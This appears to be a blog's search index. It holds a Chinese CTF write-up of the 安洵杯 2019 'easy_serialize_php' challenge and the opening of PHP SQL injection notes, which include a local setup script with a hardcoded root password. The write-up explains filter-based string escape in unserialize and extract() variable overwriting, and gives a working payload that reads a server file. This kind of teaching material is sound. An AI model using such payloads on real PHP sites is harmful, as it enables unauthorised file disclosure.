<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Funcky_Night</title>
    <url>/rustymoon/2023/10/28/Funcky-Night/</url>
    <content><![CDATA[<p>随手起的名字，只是忽然想起来在几首歌里都听过这个funcky。</p>
]]></content>
      <tags>
        <tag>ORN</tag>
      </tags>
  </entry>
  <entry>
    <title>2019]安洵杯 easy_serialize_php</title>
    <url>/rustymoon/2023/12/04/2019-easy-serialize-php/</url>
    <content><![CDATA[<p>it’s been a long time to do ctf</p>
<span id="more"></span>

<p>看了原理觉得自己会了，实践起来Oh My Oh My God Yes or Yes not?</p>
<h1 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h1><p>先看一下源码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// f 可以通过GET方式进行传参</span>

<span class="token comment">//对特定字词进行过滤，</span>
<span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php5'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php4'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span>

<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;a href="index.php?f=highlight_file">source_code&lt;/a>'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'highlight_file'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//maybe you can find something in here!</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><font size="1">其实第一遍看的时候，只看出过滤和反序列化，以及三个 $function 带来的不同结果。</font></p>
<p>里面的关键在于</p>
<ul>
<li><p><code>filter($img)</code></p>
</li>
<li><p><code>extract($_POST)</code></p>
</li>
<li><p><code>$serialize_info = filter(serialize($_SESSION));</code></p>
</li>
<li><p><code>$userinfo = unserialize($serialize_info);</code></p>
<ul>
<li><code>echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]))</code></li>
</ul>
</li>
</ul>
<p>就写一点demo进行理解吧</p>
<h2 id="filter-serialize"><a href="#filter-serialize" class="headerlink" title="filter &amp; serialize"></a>filter &amp; serialize</h2><h3 id="get-started"><a href="#get-started" class="headerlink" title="get started"></a>get started</h3><p>依照主要逻辑写了一个demo</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">//过滤（照搬）</span>
<span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'pp5'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php4'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//传入的参数值</span>
<span class="token variable">$img</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"this is a demo"</span><span class="token punctuation">;</span>

<span class="token comment">//序列化</span>
<span class="token variable">$n</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//过滤</span>
<span class="token variable">$n1</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//反序列化</span>
<span class="token variable">$n2</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$n1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token string single-quoted-string">'serialize: &lt;br>'</span><span class="token operator">.</span><span class="token variable">$n</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'filter: &lt;br>'</span><span class="token operator">.</span><span class="token variable">$n1</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'unserialize: &lt;br>'</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$n2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>当 <code>$img = &quot;this is a demo&quot;</code> 的时候，返回：</li>
</ul>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">serialize:
s:14:"this is a demo";
filter:
s:14:"this is a demo";
unserialize:
this is a demo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>当<code>$img = array(&#39;y&#39;=&gt; &#39;u&#39;,&#39;x&#39; =&gt; &#39;fun&#39;);</code>的时候，返回：</li>
</ul>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">serialize:
a:2:&#123;s:1:"y";s:1:"u";s:1:"x";s:3:"fun";&#125;
filter:
a:2:&#123;s:1:"y";s:1:"u";s:1:"x";s:3:"fun";&#125;
unserialize:
array(2) &#123; ["y"]=> string(1) "u" ["x"]=> string(3) "fun" &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>一切都很正常。</p>
<ul>
<li>当 <code>$img = &quot;this is a flagdemo&quot;</code> 的时候，返回：</li>
</ul>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">serialize:
s:18:"this is a flagdemo";
filter:
s:18:"this is a demo";
unserialize:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>当<code>$img = array(&#39;y&#39;=&gt; &#39;flag&#39;,&#39;php&#39; =&gt; &#39;fun&#39;);</code>的时候，返回：</li>
</ul>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">serialize:
a:2:&#123;s:1:"y";s:4:"flag";s:3:"php";s:3:"fun";&#125;
filter:
a:2:&#123;s:1:"y";s:4:"";s:3:"";s:3:"fun";&#125;
unserialize:
bool(false)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>发生了问题：</p>
<p><strong>这个字符串无法被正确地反序列化。</strong>（当然这个不是重点但是有点funny）</p>
<p>因为在序列化的字符串中，<code>s:18</code>表示接下来的字符串的长度应该是18。但是在<code>filter()</code>函数处理后，字符串的实际长度变为14，所以当你尝试使用<code>unserialize()</code>函数反序列化这个字符串时，它会返回<code>FALSE</code>，并产生一个<code>E_NOTICE</code>。</p>
<p>如果是在其他题目，其实这种也很好绕过，双写 or 大小写（所以说正则表达式和白名单better at most of time）</p>
<hr>
<hr>

<h3 id="abandoned"><a href="#abandoned" class="headerlink" title="abandoned"></a>abandoned</h3><p>unserialize()有一个机制</p>
<ul>
<li><code>&#123;&#125;</code><strong>内的会进行反序列，之外的抛弃。</strong></li>
</ul>
<p>如果<code>&#123;&#125;</code>内元素个数与规定的不一致会返回：<strong>bool(false)</strong></p>
<p>比如：</p>
<p><code>$dance = &quot;a:2:&#123;s:3:\&quot;one\&quot;;s:4:\&quot;flag\&quot;;s:3:\&quot;two\&quot;;s:4:\&quot;test\&quot;;&#125;;s:3:\&quot;ddimg\&quot;;lajilaji&quot;;</code></p>
<ul>
<li>反序列化得到：<code>array(2) &#123; [&quot;one&quot;]=&gt; string(4) &quot;flag&quot; [&quot;two&quot;]=&gt; string(4) &quot;test&quot; &#125;</code></li>
</ul>
<h2 id="SESSION"><a href="#SESSION" class="headerlink" title="SESSION"></a>SESSION</h2><h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><p><code>extract($_POST);</code>，作用是将 POST （看作一个数组）传入的 数组 中的元素进行变量化</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_POST</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
    <span class="token string single-quoted-string">'username'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'John Doe'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'email'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'john@example.com'</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//得到</span>
<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'John Doe'</span><span class="token punctuation">;</span>
<span class="token variable">$email</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'john@example.com'</span><span class="token punctuation">;</span>

<span class="token comment">//在之后的引用中，直接写</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>该函数存在的一个安全问题——操作不当会<strong>覆盖原有变量</strong>。</p>
<p>这也是本题的关键之处之一。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//对存在的 $_SESSION进行重置 = NULL</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//可以理解 $_SESSION 是一个数组，目前里面有这两个键值对</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span>

<span class="token operator">...</span><span class="token operator">.</span>
<span class="token comment">//该变量值为序列化后再过滤的 $_SESSION</span>
<span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">...</span>
<span class="token comment">//在前提条件下 $userinfo 变量值为 反序列化 后的上面那个变量（太长了懒得打），最后通过 file_get_contents函数将 base64 解码后的 键为 img 的变量的值输出</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token operator">...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>

<p>简单一个demo test</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span>

<span class="token comment">//before</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br/>"</span><span class="token punctuation">;</span>

<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//after</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>POST传参：<code>_SESSION[flag]=123f</code>，结果是：</p>
<p>&#x2F;&#x2F;before<br>array(2) { [“user”]&#x3D;&gt; string(5) “guest” [“function”]&#x3D;&gt; string(1) “f” }<br>&#x2F;&#x2F;after<br>array(1) { [“flag”]&#x3D;&gt; string(4) “123f” }</p>
<p>this is<br><strong>变量覆盖</strong></p>
<hr>
<hr>

<h1 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h1><p>先捋一下：</p>
<ul>
<li><p>filter进行黑名单过滤关键词和符号</p>
</li>
<li><p>序列化</p>
</li>
<li><p>extract()函数存在可控变量</p>
</li>
<li><p>在 <code>$function == &#39;show_image&#39;</code>条件下进行输出</p>
</li>
<li><p>$_SESSION 经过 <strong>序列化</strong> 经过 <strong>自定义过滤</strong> 经过 <strong>反序列化</strong> 最后 召唤 img 键值</p>
</li>
</ul>
<p>所以重点来到究竟传参什么</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//如果不存在 img_path 就赋值 $_SESSION['img'] 为 base64 编码后的 那个png</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token comment">//否则就赋值为 base64 编码后又SHA-1编码后的 img_path</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token operator">...</span>
<span class="token comment">//输出的是$_SESSION中的键 img 的值</span>
<span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>so,<br>传入一个抛弃原有 img 键值对的 <strong>新_SESSION</strong></p>
<p><strong>构造（img 值要进行编码以适应解码）</strong>：<br><code>f = show_image</code>（GET传参构造条件）<br><code>_SESSION[flagflag]=&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</code></p>
<br>
<br>

<p>经过上述$_SESSION的取经路，</p>
<ul>
<li><p>serialize构造出一个<br><code>a:1:&#123;s:8:&quot;flagflag&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;&quot;;&#125;</code></p>
</li>
<li><p>过滤一下<br><code>a:1:&#123;s:8:&quot;&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;&quot;;&#125;</code></p>
</li>
<li><p>真正起作用的(抛弃多余部分)<br><code>a:1:&#123;s:8:&quot;&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</code></p>
</li>
</ul>
<p>可以看到 img 键值已经出现且重写。</p>
<p>接收响应会得到</p>
<p><code>$flag = &#39;flag in /d0g3_fllllllag&#39;;</code></p>
<img src="/rustymoon/2023/12/04/2019-easy-serialize-php/get.png" class>

<p>将那段字符base64 后甩入img值中，接收响应得到flag。</p>
<h1 id="Q"><a href="#Q" class="headerlink" title="Q"></a>Q</h1><p>其实payload在进行反序列化的时候会出现问题，返回bool(false)，但是为什么依旧可以进行，有点不理解。</p>
<img src="/rustymoon/2023/12/04/2019-easy-serialize-php/boolfalse.png" class>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP_SQL-Injection</title>
    <url>/rustymoon/2023/11/20/PHP-SQL-Injection/</url>
    <content><![CDATA[<p>有点好久不见，之前在入门之处学的第一个就是这个漏洞，不过那个时候学的是漏洞，没有涉及到专门分语言的。</p>
<span id="more"></span>

<h1 id="SQL-Injection-原理"><a href="#SQL-Injection-原理" class="headerlink" title="SQL Injection 原理"></a>SQL Injection 原理</h1><blockquote>
<p>将恶意SQL语句注入到Web表单的输入页面中，该恶意SQL语句会导致原有的SQL语句发生改变，从而达到攻击者的目的去让它去执行一些危险的数据操作。</p>
</blockquote>
<p>简单说，所有涉及到的数据库的 <strong>增删改查</strong> 操作的功能点都有可能存在SQL Injection。</p>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><img src="/rustymoon/2023/11/20/PHP-SQL-Injection/SQL-Injection.png" class title="SQL注入分类">

<p>之前单独学习的时候，只学到报错注入、盲注、堆叠注入，就觉得OMG怎么这么难，堪比现在的我面对数电实验之4位并行加法器。</p>
<hr>
<hr>




<h1 id="init"><a href="#init" class="headerlink" title="init()"></a>init()</h1><p>在开始之前，先搞好配置吧。</p>
<p>phptorm + XAMPP</p>
<p>有phpstorm最好，没有的请有phpstudy或者XAMPP之类工具（有phpstorm也要有当然如果你自己本地有php就不需要了）。</p>
<p>参考一下：</p>
<ul>
<li><p><a href="https://cloud.tencent.com/developer/article/1739540">phpstorm运行本地php文件</a></p>
</li>
<li><p><a href="https://www.runoob.com/php/php-mysql-insert.html">php连接MySQL</a></p>
</li>
<li><p><a href="https://c.biancheng.net/view/2625.html">MySQL Workbench基本使用</a>（如果有安装MySQL的话……没有也没事，XAMPP或者phpstudy自带）</p>
</li>
</ul>
<p>然后写了一个测试php：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span>
<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span>
<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Flask08"</span><span class="token punctuation">;</span>
<span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"demo"</span><span class="token punctuation">;</span>

<span class="token comment">// 创建链接</span>
<span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">,</span><span class="token number">3306</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 检查链接</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$conn</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"连接失败: "</span> <span class="token operator">.</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO user (username, email, password,  id)
VALUES ('Lisa', 'lias@example.com', 'fdaggsd' , 3);"</span><span class="token punctuation">;</span>


<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"新记录插入成功"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Error: "</span> <span class="token operator">.</span> <span class="token variable">$sql</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br>"</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>测试结果：</p>
<img src="/rustymoon/2023/11/20/PHP-SQL-Injection/test.png" class title="连接测试">

<img src="/rustymoon/2023/11/20/PHP-SQL-Injection/inser.png" class title="插入数据">

<p>(尝试使用muti_query不知道为什么出错了，感觉可能又是php版本不兼容，我的是5.6)</p>
<hr>
<p><a href="https://stackoverflow.com/questions/11448068/mysql-error-code-1175-during-update-in-mysql-workbench">尝试用SQL语句在Workbench中删除记录时遇到的一个问题以及解决方法</a></p>
<hr>
<hr>

